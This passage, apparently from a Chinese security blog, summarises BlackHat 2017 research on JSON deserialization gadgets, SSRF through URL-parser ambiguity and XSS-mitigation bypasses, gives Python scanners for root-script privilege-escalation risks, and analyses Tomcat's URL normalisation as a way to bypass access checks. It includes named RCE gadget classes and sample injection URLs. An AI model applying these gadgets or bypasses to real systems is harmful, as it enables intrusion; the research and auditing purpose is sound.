反序列化攻击中，攻击者要能控制对象图中某个对象，注入Gadgets类型来实现攻击。而Gadgets类型就是在其反序列化回调过程中可以注入恶意代码并被执行的类，比如JDK的TemplatesImpl类。因此，反序列化漏洞研究的思路可以归结为两点：如何控制对象类型和寻找Gadgets类型。 JSON反序列化过程JSON反序列化就是JSON unmarshaller根据JSON数据（字符串）重新构造出对象（Object）。 其中，最常见的几种实现方法如下： 通过默认构造函数与反射实现Java的JSON-IO库、经典的.NET deserializer（当反序列化类型有@Serializable注解但没有实现ISerializable接口）。这些JSON反序列化过程会调用一些函数，而如果这些函数中存在危险操作则存在反序列化漏洞的风险： 析构函数，如Finalize()，对象被垃圾回收时触发； 一些类型不能通过反射来构建，例如.NET的Hashtable，hash值需要重新计算，因此很多方法如HashCode()、Equal()、Compare()等可能被调用； 其他可能调用到的方法，如异常处理器调用toString()； 通过默认构造函数与setters实现与前一个方法类似，但不使用反射，而使用property/field的set方法（setters）来操作对象的fields。 通常这样的反序列化器只处理public的property/field，比前一个方法限制多一些。尽管如此，大部分的反序列化器使用这种方案。但是，某些情况下，反序列化器会通过反射调用private setter。 因为标准库和三方库中普遍存在自定义setter，因此Gadgets类型的范围非常广，这也是为啥Jackson和Fastjson不断爆出新的绕过黑名单的Gadgets CVE的原因（通过对Fastjson和Jackson的分析，这些库对于Map、Collection类型的数据支持通过getter方法设置值，等同于setter）。 通过特殊构造函数/类型转换器/回调函数实现Java和.NET的反序列化回调方法，比如Json.NET的OnError属性，Java的readObject()，.NET中ISerializable的特殊构造函数，.NET中OnDeserialized和OnDeserializing注解的方法，XmlSerializer中IXmlSerializable的ReadXml()等。 JSON库的反序列化器提供注解的反序列化回调函数的情况很少见，一些库会调用到Java/.NET的反序列化回调。 由此可见，JSON反序列化过程没有调用Object deserialization（Java原生反序列化）的callbacks，因此Java反序列化的Gadgets类型大多数对JSON反序列化是没用的。 当然，也有个别方法在JSON反序列化过程中被调用，可以根据此启动Gadget链： Non-default constructor Setters Type Converters（.NET特有） 作者发现大多数JSON库都调用setter方法来处理对象成员，因此关注点应该放在那些会导致任意代码执行的setter方法中（大多数Gadget类型的特性）。 JSON库判断field是否存在、如何确定setter方法，不同的库有各自的实现，这两点如果处理不好就导致漏洞的存在，同时这两点也是分析反序列化新Gadget的重点。 RCE Gadgets作者提及的几个Gadgets。 注意：JDK8u121默认禁止了通过JNDI对象Factory来加载远程Class，但不影响LDAP的利用方式。具体参考JNDI注入的文章。 org.hibernate.jmx.StatisticsServicesetSessionFactoryJNDIName() -&gt; JNDI lookup com.atomikos.icatch.jta.RemoteClientUserTransactiontoString() -&gt; JNDI lookup com.sun.rowset.JdbcRowSetImplsetAutoCommit() -&gt; JNDI lookup，JDK自带 org.antlr.stringtemplate.StringTemplatetoString()，可以被利用来和其他Gadget类形成Gadget利用链，比如TemplatesImpl.getOutputProperties() 各种JSON库的安全性与漏洞模式Default：默认支持类型指定；Configuration：通过配置可支持类型指定。 Jackson通过ObjectMapper.enableDefaultTyping()全局使能动态类型指定（当然还有注解的方式即@JsontypeInfo），并且支持通过参数限定哪些类型的成员变量支持动态类型，包括： JAVA_LANG_OBJECT：仅影响Object.class类型的属性； OBJECT_AND_NON_CONCRETE：影响Object.class和所有non-concrete类型（抽象类、接口等）； NON_CONCRETE_AND_ARRAYS：同时，另加所有数组类型（元素均为Object.class和所有non-concrete类型）； NON_FINAL：影响所有不声明为final的类型，以及元素中为non_final类型的数组； Jackson反序列化过程中会调用被反序列化类的setter方法，并没有进行任何的类型检查。 Genson通过useRuntimeType()开关使能动态类型绑定，这点和Jackson的enableDefaultTyping()类似。 Genson有对象图的类型检查，因此要实现RCE需要在反序列化的类型中找到入口点。 同样，Genson反序列化过程中会调用被反序列化类的setter方法。 JSON-IOJSON-IO的反序列化： 调用反射设置值，不调用setter方法； 反序列化过程中出现异常时会调用待反序列化的类的toString()方法； 攻击者可以故意在某个成员的赋值时触发异常，在toString()函数中注入恶意代码实现攻击。 FlexSON默认配置下就支持动态类型的反序列化，并且没有类型检查。 同样，FlexSON反序列化过程中会调用被反序列化类的setter方法。 对类型检查防御的Bypass思路一些库做类型检查的方式是探测（inspect）将要反序列化的类型的对象图（得到其所有field及其类型），仅允许与成员变量的类型匹配（assignable）的赋值。 此时若想实现RCE，需要找到对象图上的一个入口点，这个点仍能指定为Gadget类型。 比如： 若对象图中有成员变量是java.lang.Object类型或者泛型类型（如Message&lt;T&gt;），那么可以将其当做入口点； 若对象图中有成员变量的类型是T，T的子类中有成员变量是Object类型。比如java.lang.Exception的子类javax.management.InvalidApplicationException； 注意：Jackson、Fastjson是使用黑名单禁止反序列化Gadgets类的，这种只能通过新Gadget来Bypass。 0x04 A NEW ERA OF SSRF - EXPLOITING URL PARSER IN TRENDING PROGRAMMING LANGUAGES!（利用URL解析器进行SSRF攻击）PDF：https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf 简介议题的重点是Protocol Smuggling，主要是HTTP请求走私。 作者展示了Python、PHP、Curl中各个Library对特殊形式HTTP请求处理的差异，并利用这些差异实现SSRF。 出现该问题的原因在于，HTTP URI的标准有处理建议，但并非强制要求，并且对不符合标准结构的特殊情况没有规定如何处理，因此不同的库都会有自己的实现方式。 因此，协议走私可以简单理解为二义性问题，即特殊形式的请求报文在不同的解析器下有不同的理解，这种差异结果可被攻击者利用来绕过安全检查或者实现某种攻击如SSRF等。 基本概念与原理作者对于本议题的研究灵感来源于CVE-2016-8624：invalid URL parsing with &#39;#&#39;。 作者对所有语言的Library进行了测试，各个库的处理情况如下： 注意：Port注入类似http://127.0.0.1:12345:80；Host注入类似http://a.com#@evil.com；Path注入类似http://a.com/test/../info等。 利用这种解析的二义性，就能进行如SSRF的攻击。 技术点SNI注入SNI（Server Name Indication，服务器名称指示）定义在RFC 4366，是一项用于改善SSL/TLS的技术，在SSLv3/TLSv1中被启用。它允许客户端发起SSL握手请求时（具体说是客户端发出SSL请求中的ClientHello阶段）就提交请求的Host信息，使得服务器能够切换到正确的域并返回对应的证书。 注意：SNI是明文传输。 因此，HTTPS的SNI存在Host头一样的走私方法，如下图CRLF注入： Node.JS大写N（U+FF2E）的宽字节形式可以代替..使用。 Unicode字符U+FF0D U+FF0A可以作为CRLF字符使用。 glibc NSS特性gethostbyname()支持十进制数表示Hsot。 Linux getaddrinfo()会忽略Host中空格之后的内容，很多库的实现依赖该函数，而有些库会进行两次URL解码。 HTTPConnection.puthreader()禁止CRLF后面的空白，但可以在前面加上空白来绕过。这可以绕过Python CVE-2016-5699补丁的限制。 遵循的标准不同URL parser和URL requester遵循的IDNA标准不同时也会导致解析差异。 0x05 DON’T TRUST THE DOM: BYPASSING XSS MITIGATIONS VIA SCRIPT GADGETS（利用Script Gadgets绕过XSS缓解措施）PDF：https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf 基本概念与原理XSS Mitigation即XSS缓解措施，该机制是通过识别并阻止恶意的标签或属性来缓解XSS攻击。常见的XSS MITIGATIONS机制有浏览器的CSP机制、XSS Auditor、XSS Filter、WAF的过滤器等。 当今Web应用都普遍使用JavaScript框架，而JavaScript框架通常是用到了DOM操纵技术，即从DOM中读取数据、修改DOM的结构等。在实现上是使用selector（选择器），通过某种形式的语法来选取DOM中特定的单个或多个标签，来读写器属性或文本。 那么是否可以通过JS框架的script来绕过XSS Mitigation机制呢？——使用Script Gadget来绕过。 什么是Script Gadget？——简单地说，Script Gadget就是在当前页面中可被利用来绕过XSS Mitigation机制的JS代码。 页面上通过selector读取标签属性的JS脚本片段，使用了会导致脚本执行的API（比如上图的html()）来处理读取的数据。这里注入的XSS数据时一段HTML代码，没有script和on事件等恶意标签或属性，恶意脚本藏在data-text的值中，且该值不受XSS Mitigation机制的限制；当经过正文JS脚本中selector的处理后，data-text的值就被放入buttons.html() API中使用，进而放入DOM中导致恶意脚本被执行。这整个过程就是使用无害的JS库的API来绕过XSS Mitigation机制的。 注意：注入的数据经过了HTML编码，但是仍然能够执行XSS，这是因为注入的内容在div标签中，会先被HTML解析器进行HTML解码。 针对Gadgets的研究，作者做了充分的实验测试，具体的可参考PDF连接文档。 具体的Script Gadget PoC都在：https://github.com/google/security-research-pocs 研究结论除了React库外，其他库都存在Script Gadget可以绕过特定的XSS Mitigation，其中Emberjs仅在开发者版本中存在绕过风险：","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"BlackHat","slug":"BlackHat","permalink":"https://www.mi1k7ea.com/tags/BlackHat/"}]},{"title":"Python安全小工具之脚本提权扫描","date":"2020-04-12T12:39:56.000Z","path":"2020/04/12/Python安全小工具之脚本提权扫描/","text":"脚本提权类问题脚本提权类问题，大致分为两种： root等高权限用户会去执行的脚本，低权限用户对该脚本拥有写权限，将导致低权限用户输入的命令被高权限执行； 以root等高权限用户作为属主的脚本中，低权限用户对该脚本未拥有写权限，但是该脚本中调用了低权限用户拥有写权限的脚本也会导致提权； 扫描脚本1该脚本原理比较简单，针对前面说的第二点脚本提权类问题，就是全局搜索属主为root的sh文件，然后循环遍历其中的文件内容是否存在调用属主为其他用户的脚本，若有则判定为存在脚本提权问题。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding=utf-8import osimport sysdef scan(path, highuser, lowuser): cmd1 = \"find \" + path + \" -name \\\"*.sh\\\" -user \" + highuser + \" 2&gt;/dev/null\" print \"[*]Running command: \" + cmd1 result = os.popen(cmd1).read() files = result.split(\"\\n\") for file in files: if not os.path.exists(file): continue try: f = open(file, \"r\") flag = 0 scriptname = \"\" for line in f.readlines(): content = line.split() for c in content: if c.endswith(\".sh\"): name = os.path.basename(c) cmd2 = \"find / -name \" + name + \" -user \" + lowuser + \" 2&gt;/dev/null\" print \"[*]Running command: \" + cmd2 result = os.popen(cmd2).read() if result.find(name) != -1: flag = 1 scriptname = name break if flag == 1: break if flag == 1: output = \"[+]Found Root Script:\" + file + \"\\n[!]Check:[\" + scriptname + \"]\\n\\n\" print output with open(\"scan_result.txt\", \"a\") as rfile: rfile.write(output) scriptname = \"\" flag = 0 except IOError as e: print \"[-]Error: \" + file + \" | \" + e finally: if f: f.close()if __name__ == '__main__': if len(sys.argv) != 4: print \"[*]Usage: python RootScriptScan.py [Dir Path] [High Privilege Username] [Low Privilege Username]\" else: scan(sys.argv[1], sys.argv[2], sys.argv[3]) print \"[*]Finished.\" 该脚本需要输入三个参数，分别是扫描的目录位置、高权限用户名和低权限用户名。 扫描效果： 扫描脚本2代码如下，注释中已有说明： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389#!/usr/bin/python#coding:utf-8import os,re,time,sysfrom os import path \"\"\"使用方法： python find_risky_root_run_scripts.py XXX (XXX为整数，指配置工具运行的秒数)功能介绍： 1. 可以识别一段时间内所有root运行过的脚本，包括绝对路径和相对路径； 2. 排查以上脚本的属主权限、三组文件权限； 3. 遍历以上脚本的所有父目录，排查所有父目录的属主权限、三组目录权限。 4. 可以打印所有有目录漏洞的脚本列表及对应的漏洞目录，以及汇总呈现所有有漏洞目录的报表\"\"\"def get_dir_privilege(dir_name): try: query_privilege_shellcmd = 'ls -al %s | awk \"NR==2\"'%(dir_name) privilege_result = os.popen(query_privilege_shellcmd).read().split() #Debug # 定位特定目录与预期结果不符合的debug代码，得出原因是应该是ls -al ，而不是ls -l， 少了个a导致行号不对 #if dir_name == '/opt/HUAWEI/cgp': # print query_privilege_shellcmd # print privilege_result #u,g,o,owner,group = privilege_result[0][1:4],privilege_result[0][4:7],privilege_result[0][7:10],privilege_result[2],privilege_result[3] u,g,o,owner,group = privilege_result[0][1:4],privilege_result[0][5:6],privilege_result[0][8:9],privilege_result[2],privilege_result[3] return &#123;'u':u,'g':g,'o':o,'owner':owner,'group':group&#125; except: return &#123;&#125;def check_dir_vulnerable(dirname): is_dir_vulnerable = False dir_privilege = get_dir_privilege(dirname) # 1.目录属主非root if dir_privilege and dir_privilege['owner'] != 'root': is_dir_vulnerable = True #print(\"dir_is_vulnerable, owner=%s\"%(dir_privilege['owner'])) # 2. root属主，但其他组可写 if dir_privilege and dir_privilege['owner'] == 'root' and ( (dir_privilege['group'] == 'root' and dir_privilege['o'] != '-' ) or (dir_privilege['group'] != 'root' and (dir_privilege['g'] != '-' or dir_privilege['o'] != '-' )) ): is_dir_vulnerable = True #print(\"dir_is_vulnerable=%s group=%s others=%s\"%(dirname,dir_privilege['g'],dir_privilege['o'])) return is_dir_vulnerabledef get_one_root_script_dirs(full_path_to_filename): # Debug: 首先打印当前文件路径 #print(\"filename=%s\" %(full_path_to_filename)) all_one_root_script_dirs = set() # Debug: 考虑极端根目录的场景 # full_path_to_filename = os.path.dirname(full_path_to_filename) # 所有的父目录(根目录除外) 还要防止输入相对路径导致while死循环(\".\"的父目录还是\".\") while full_path_to_filename != \"/\" and full_path_to_filename != \".\": full_path_to_filename = os.path.dirname(full_path_to_filename) #print(full_path_to_filename) all_one_root_script_dirs.add(full_path_to_filename.strip()) return list(all_one_root_script_dirs)def check_dirs_vulnerable(one_root_script): is_dirs_vulnerable = False # 遍历所有上级目录 one_root_script_dirs = set() one_root_script_dirs = get_one_root_script_dirs(one_root_script) for dir in one_root_script_dirs: is_dirs_vulnerable_tmp = False is_dirs_vulnerable_tmp = check_dir_vulnerable(dir) if is_dirs_vulnerable_tmp: is_dirs_vulnerable = True # Debug #print(\"dir is vulnerable= %s\"%(dir)) # Debug #if is_dirs_vulnerable: # print(one_root_script) return is_dirs_vulnerabledef get_dirs_vulnerable(one_root_script): is_dirs_vulnerable = False one_root_script_dirs_vulnerable = set() # 遍历所有上级目录 one_root_script_dirs = set() one_root_script_dirs = get_one_root_script_dirs(one_root_script) for dir in one_root_script_dirs: is_dirs_vulnerable_tmp = False is_dirs_vulnerable_tmp = check_dir_vulnerable(dir) if is_dirs_vulnerable_tmp: is_dirs_vulnerable = True one_root_script_dirs_vulnerable.add(dir.strip()) # Debug #print(\"dir is vulnerable= %s\"%(dir)) # Debug #if is_dirs_vulnerable: # print(one_root_script) #return is_dirs_vulnerable return one_root_script_dirs_vulnerabledef get_file_privilege(file_name): try: query_script_privilege_shellcmd = 'ls -l %s'%(file_name) privilege_result = os.popen(query_script_privilege_shellcmd).read().split() #u,g,o,owner,group = privilege_result[0][1:4],privilege_result[0][4:7],privilege_result[0][7:10],privilege_result[2],privilege_result[3] u,g,o,owner,group = privilege_result[0][1:4],privilege_result[0][5:6],privilege_result[0][8:9],privilege_result[2],privilege_result[3] return &#123;'u':u,'g':g,'o':o,'owner':owner,'group':group&#125; except: return None def check_file_vulnerable(filename): is_file_vulnerable = False file_privilege = get_file_privilege(filename) # 1.文件属主非root if file_privilege and file_privilege['owner'] != 'root': is_file_vulnerable = True # 2. root属主，但其他组可写 # if file_privilege['owner'] == 'root' and file_privilege['o'] == 'w': if file_privilege and file_privilege['owner'] == 'root' and ( (file_privilege['group'] == 'root' and file_privilege['o'] != '-' ) or (file_privilege['group'] != 'root' and (file_privilege['g'] != '-' or file_privilege['o'] != '-' )) ): is_file_vulnerable = True # Debug #print(\"file_is_vulnerable=%s group=%s others=%s\"%(filename,file_privilege['g'],file_privilege['o'])) return is_file_vulnerabledef get_all_root_running_script(scan_period): # 《 Python控制台输出带颜色的文字方法： https://www.cnblogs.com/yinjia/p/5559702.html 》 # 格式： \\033[显示方式;前景色;背景色m # 例如： # \\033[1;31;40m &lt;1-高亮显示 31-前景色红色 40-背景色黑色&gt; # \\033[0m &lt;采用终端默认设置，即取消颜色设置&gt; print '\\033[5;32m[*] Collect all root running scripts in %d seconds ......\\033[0m\\n'%scan_period root_running_script_list_all = set() root_running_script_list_exists = set() root_running_script_list_no_exist = set() #waiting_reverse_loookup_list = [] waiting_reverse_loookup_list = set() waiting_reverse_loookup_list_debug = set() #query_root_running_script_by_shellcmd = 'ps -U root -u root u | egrep \"*\\.sh*\" | grep -v egrep' query_root_running_script_by_shellcmd = 'ps -U root -u root u | egrep \".*\\.py.*|.*\\.sh.*\" | grep -v egrep' start_time = int(time.time()) while int(time.time()) - start_time &lt;= scan_period: # 在此处正则添加要匹配的文件后缀 # for i in re.findall(r\"/\\S*\\.sh|/\\S*\\.py\",os.popen(query_root_running_script_by_shellcmd).read()): for i in re.findall(r\"\\S+\\.sh|\\S+\\.py\",os.popen(query_root_running_script_by_shellcmd).read()): if i.count('/') &lt;= 1: # 《 正则表达式30分钟入门教程： https://deerchao.net/tutorials/regex/regex.htm 》 # 《 Python中正则表达式re.match的用法： https://blog.csdn.net/piglite/article/details/81121323 》 # 匹配到相对路径，需要反查可能的绝对路径，将文件名添加到列表，加入前利用正则表达式先过滤掉非正常文件名)，待扫描周期结束后一次性查找 #waiting_reverse_loookup_list.append(i.split('/')[-1].strip()) if re.match('^[a-zA-Z.\\-_]+$',i) or re.match('^[.][/]',i): waiting_reverse_loookup_list.add(i.split('/')[-1].strip()) elif( re.match('^[^/]',i)): # 匹配到不以\"/\"开头的路径，虽然包括多个\"/\"符号，同样按照相对路径处理 waiting_reverse_loookup_list.add(i.split('/')[-1].strip()) else: # 匹配到绝对路径，直接记录 root_running_script_list_all.add(i.strip()) # 由文件名反查绝对路径 if waiting_reverse_loookup_list: # Debug: 查找需要反查的路径，用于训练 print '本程序抓取的采用相对路径运行的程序有:' print (waiting_reverse_loookup_list) lookup_filenames = '|'.join(waiting_reverse_loookup_list) # Debug: 查找需要反查的路径，用于训练 #print (lookup_filenames) if lookup_filenames: reverse_lookup_cmd = 'find / \\( -path /proc -o -path /var \\) -prune -o -print | grep -E \"^*/(%s)$\"'%(lookup_filenames) for i in os.popen(reverse_lookup_cmd).readlines(): # 将反查路径得来的结果放入列表；在存在相同文件名的情况下，可能会产生误报(概率极小) root_running_script_list_all.add(i.strip()) #Debug: 将反查的结果放入不处理的临时Debug列表waiting_reverse_loookup_list_debug中，这样后续处理的都是绝对路径，达到不反查相对路径的效果，无同名误报 #waiting_reverse_loookup_list_debug.add(i.strip()) # Debug: 当前过滤机制下很难出现不存在的脚本调用，构造一个用于测试此部分逻辑功能 #root_running_script_list_no_exist.add(\"/root/x00202367\") # 过滤不存在的路径 if root_running_script_list_all: for script in root_running_script_list_all: #if os.path.exists(script): if os.path.isfile(script): root_running_script_list_exists.add(script.strip()) else: root_running_script_list_no_exist.add(script.strip()) # 输出所有存在的脚本的路径 #if root_running_script_list_exists: # 将root_running_script_list_exists输出到控制台 #print(\"\\n-----begin of root_running_script_list_exists:-----\") #print(root_running_script_list_exists) #for one_root_script in root_running_script_list_exists: # print(one_root_script) #print(\"-----end of root_running_script_list_exists!-----\\n\") # 将root_running_script_list_exists写入文件 #with open('./root_running_script_list_exists.txt', 'a+') as f: # for one_root_script in root_running_script_list_exists: # f.write(\"\\n%s\"%(one_root_script)) # 输出不存在的脚本的路径 if root_running_script_list_no_exist: # 将root_running_script_list_no_exist输出到控制台 print(\"\\033[34m\\n\") #print(\"\\n-----begin of root_running_script_list_no_exist:-----\") print(\"[*]Please check the following paths manully:\") #print(root_running_script_list_no_exist) for one_root_script in root_running_script_list_no_exist: print(one_root_script) #print(\"-----end of root_running_script_list_no_exist!-----\\n\") print(\"\\033[0m\") # 将root_running_script_list_no_exist写入文件 #with open('./root_running_script_list_no_exist.txt', 'a+') as f: # for one_root_script in root_running_script_list_no_exist: # f.write(\"%s\\n\"%(one_root_script)) return list(root_running_script_list_exists)def find_risky_root_running_scripts(scan_period): #获取所有正在root运行的文件路径 root_running_script_list = get_all_root_running_script(scan_period) #root_running_script_list_with_risk = set() root_running_script_list_with_dirs_risk = set() root_running_script_list_with_file_risk = set() #判断所有文件的文件权限及目录权限 for one_root_script in root_running_script_list: #is_script_vulnerable = False is_script_dirs_vulnerable = False is_script_file_vulnerable = False is_script_dirs_vulnerable = check_dirs_vulnerable(one_root_script) is_script_file_vulnerable = check_file_vulnerable(one_root_script) if is_script_dirs_vulnerable: #is_script_vulnerable = True root_running_script_list_with_dirs_risk.add(one_root_script) if is_script_file_vulnerable: #is_script_vulnerable = True root_running_script_list_with_file_risk.add(one_root_script) #if is_script_vulnerable: # root_running_script_list_with_risk.add(one_root_script) # 由root_running_script_list_with_dirs_risk汇总出所有的risky_dirs_of_root_running_scripts risky_dirs_of_root_running_scripts = set() # 输出所有有目录提权漏洞的脚本路径，以及有问题的目录 # 《 python中sorted()和set()去重，排序: https://www.cnblogs.com/sen-c7/p/10414427.html 》 if root_running_script_list_with_dirs_risk: root_running_script_list_with_dirs_risk_sorted = sorted(root_running_script_list_with_dirs_risk) print(\"\\033[1;31m\\n\\n\") print(\"[*]root_running_script_list_with_dirs_risk_sorted, and their dirs:\") for script in root_running_script_list_with_dirs_risk_sorted: # 首先打印脚本路径 print(\"\\n\\n%s:\" %script) # 其次打印该脚本有问题的目录，并汇总到risky_dirs_of_root_running_scripts中 risky_dirs_of_root_running_script = get_dirs_vulnerable(script) risky_dirs_of_root_running_script_sorted = sorted(risky_dirs_of_root_running_script, reverse=True) if risky_dirs_of_root_running_script_sorted: for dir in risky_dirs_of_root_running_script_sorted: print (dir) risky_dirs_of_root_running_scripts.add(dir.strip()) print(\"\\033[0m\") # 输出汇总后的有问题的目录 if risky_dirs_of_root_running_scripts: risky_dirs_of_root_running_scripts_sorted = sorted(risky_dirs_of_root_running_scripts) print(\"\\033[1;31m\\n\\n\") print(\"[*]risky_dirs_of_root_running_scripts_sorted:\") for dir in risky_dirs_of_root_running_scripts_sorted: print (dir) print(\"\\033[0m\") # 输出所有有文件权限提权或者目录提权的脚本路径 #if root_running_script_list_with_risk: # 将root_running_script_list_with_risk输出到控制台 #print(\"\\033[1;31m\\n\") #print(\"[*]root_running_script_list_with_risk:\") #for one_root_script in root_running_script_list_with_risk: # print(one_root_script) #print(\"\\033[0m\") # 将root_running_script_list_with_risk写入文件 #with open('./root_running_script_list_with_risk.txt', 'a+') as f: # for one_root_script in root_running_script_list_with_risk: # f.write(one_root_script) # 输出所有有目录提权的脚本路径 if root_running_script_list_with_dirs_risk: root_running_script_list_with_dirs_risk_sorted = sorted(root_running_script_list_with_dirs_risk) # 将root_running_script_list_with_dirs_risk_sorted输出到控制台 print(\"\\033[1;31m\\n\") print(\"[*]root_running_script_list_with_dirs_risk_sorted:\") for one_root_script in root_running_script_list_with_dirs_risk_sorted: print(one_root_script) print(\"\\033[0m\") # 将root_running_script_list_with_dirs_risk_sorted写入文件 #with open('./root_running_script_list_with_dirs_risk_sorted.txt', 'a+') as f: # for one_root_script in root_running_script_list_with_dirs_risk_sorted: # f.write(one_root_script) # 输出所有有文件权限提权的脚本路径 if root_running_script_list_with_file_risk: root_running_script_list_with_file_risk_sorted = sorted(root_running_script_list_with_file_risk) # 将root_running_script_list_with_file_risk_sorted输出到控制台 print(\"\\033[1;31m\\n\") print(\"[*]root_running_script_list_with_file_risk_sorted:\") for one_root_script in root_running_script_list_with_file_risk_sorted: print(one_root_script) print(\"\\033[0m\") # 将root_running_script_list_with_file_risk_sorted写入文件 #with open('./root_running_script_list_with_file_risk_sorted.txt', 'a+') as f: # for one_root_script in root_running_script_list_with_file_risk_sorted: # f.write(one_root_script)if __name__ == '__main__': find_risky_root_running_scripts(int(sys.argv[1])) print '\\n'","tags":[{"name":"安全开发","slug":"安全开发","permalink":"https://www.mi1k7ea.com/tags/安全开发/"},{"name":"Python","slug":"Python","permalink":"https://www.mi1k7ea.com/tags/Python/"}]},{"title":"（先知首发）Tomcat URL解析差异性及利用","date":"2020-04-01T15:47:17.000Z","path":"2020/04/01/Tomcat-URL解析差异性及利用/","text":"先知：https://xz.aliyun.com/t/7544 0x01 简介Tomcat是常见的Web中间件，实际上是利用NIO技术处理HTTP请求，在接收到请求时会对客户端提交的参数、URL、Header和Body数据进行解析，并生成Request对象，然后调用实际的JSP或Servlet。 当后台程序使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会造成访问限制绕过的安全风险。 0x02 URL解析差异性HttpServletRequest中几个解析URL的函数在Servlet处理URL请求的路径时，HTTPServletRequest有如下几个常用的函数： request.getRequestURL()：返回全路径； request.getRequestURI()：返回除去Host（域名或IP）部分的路径； request.getContextPath()：返回工程名部分，如果工程映射为/，则返回为空； request.getServletPath()：返回除去Host和工程名部分的路径； request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null； 网上的一个小结，Servlet的匹配路径为/test%3F/*，并且Web应用是部署在/app下，此时请求的URL为http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a，各个函数解析如下表： 函数 URL解码 解析结构 getRequestURL() no http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID getRequestURI() no /app/test%3F/a%3F+b;jsessionid=s%3F+ID getContextPath() no /app getServletPath() yes /test? getPathInfo() yes /a?+b 特殊字符的URL解析新建一个Java Web项目，index.jsp如下： 1234567&lt;%out.println(\"getRequestURL(): \" + request.getRequestURL() + \"&lt;br&gt;\");out.println(\"getRequestURI(): \" + request.getRequestURI() + \"&lt;br&gt;\");out.println(\"getContextPath(): \" + request.getContextPath() + \"&lt;br&gt;\");out.println(\"getServletPath(): \" + request.getServletPath() + \"&lt;br&gt;\");out.println(\"getPathInfo(): \" + request.getPathInfo() + \"&lt;br&gt;\");%&gt; 正常访问Tomcat运行之后，正常访问http://localhost:8080/urltest/index.jsp，页面输出如下： 插入 ./ 访问尝试插入多个./访问即http://localhost:8080/urltest/./././index.jsp，页面输出如下： 可以看到，插入多个./也能正常访问。 接着尝试这种形式http://localhost:8080/urltest/.a/.bb/.ccc/index.jsp，发现是返回404，未找到该资源访问： 插入 ../ 访问尝试插入../访问即http://localhost:8080/urltest/../index.jsp，页面输出如下： 可以是返回的404，这是因为实际访问的是http://localhost:8080/index.jsp，这个目录文件当然不存在。 换种跨目录的形式就OK了http://localhost:8080/urltest/noexist/../index.jsp： 插入 ;/ 访问尝试插入多个;/访问即http://localhost:8080/urltest/;/;/;/index.jsp，页面输出如下： 可以看到，插入多个;也能正常访问。 在;号后面加上字符串也是能正常访问的，如http://localhost:8080/urltest/;a/;bb/;ccc/index.jsp： 插入其他特殊字符访问尝试插入如下这些特殊字符进行访问，页面均返回400或404，无法访问： 1` ~ ! @ # $ % ^ &amp; * ( ) - _ = + [ ] &#123; &#125; \\ | : &apos; &quot; &lt; &gt; ? 小结由前面的尝试知道，Tomcat中的URL解析是支持嵌入./、../、;xx/等特殊字符的。此外，getRequestURL()和getRequestURI()这两个函数解析提取的URL内容是包含我们嵌入的特殊字符的，当使用不当时会存在安全问题如绕过认证。 0x03 调试分析Tomcat会先对请求的URL进行解析处理，提取到一些信息之后才会到调用getRequestURI()等函数的流程。 Tomcat对URL特殊字符的处理这里我们先来调试分析下Tomcat是如何对请求URL中不同的特殊字符作不同的处理的。 经过调试分析，得知Tomcat是在CoyoteAdapter.service()函数上对请求URL进行解析处理的，直接在这里打上断点，此时的函数调用栈如下： 12345678service:452, CoyoteAdapter (org.apache.catalina.connector)process:1195, AbstractHttp11Processor (org.apache.coyote.http11)process:654, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote)run:317, JIoEndpoint$SocketProcessor (org.apache.tomcat.util.net)runWorker:1142, ThreadPoolExecutor (java.util.concurrent)run:617, ThreadPoolExecutor$Worker (java.util.concurrent)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:745, Thread (java.lang) 在CoyoteAdapter.service()函数中，会调用postParseRequest()函数来解析URL请求内容： 跟进postParseRequest()函数中，其中先后调用parsePathParameters()和normalize()函数对请求内容进行解析处理： 这里我们先跟进parsePathParameters()函数，先是寻找URL中是否存在;号，找到的话才会进入下面的if代码逻辑： 如果找到了;号，在if代码逻辑中后面的循环体会将;xxx/中的分号与斜杠之间的字符串以及分号本身都去掉，我们访问http://localhost:8080/urltest/;mi1k7ea/index.jsp再试下，就可以进入该代码逻辑调试看到（代码中ASCII码59是;，47是/）： 由此可知，parsePathParameters()函数是对;xxx/这种形式进行处理的。 接着，跟进normalize()函数，该函数是对经过parsePathParameters()函数处理过后的请求URL进行标准化处理。 先看到这段代码，ASCII码92表示\\，当匹配到时将其替换为ASCII码为47的/；当匹配到ASCII码0即空字符时，直接返回false无法成功解析： 往下是这段循环，判断是否有连续的/，存在的话则循环删除掉多余的/： 接着往下看，这段循环就是对./和../这些特殊字符进行处理，如果这两个字符串都找不到则直接返回true： 这里尝试下添加/./访问的处理，看到找到之后是直接将其去掉然后继续放行： 这里尝试下添加/../访问的处理，看到找到后是会进行往前目录层级的回溯处理再拼接到上面某一层目录形成新的URL： 由此可知，normalize()函数对经过经过parsePathParameters()函数过滤过;xxx/的URL请求内容进标准化处理，具体为将连续的多个/给删除掉只保留一个、将/./删除掉、将/../进行跨目录拼接处理，最后返回处理后的URL路径。 结论 Tomcat对/;xxx/以及/./的处理是包容的、对/../会进行跨目录拼接处理。 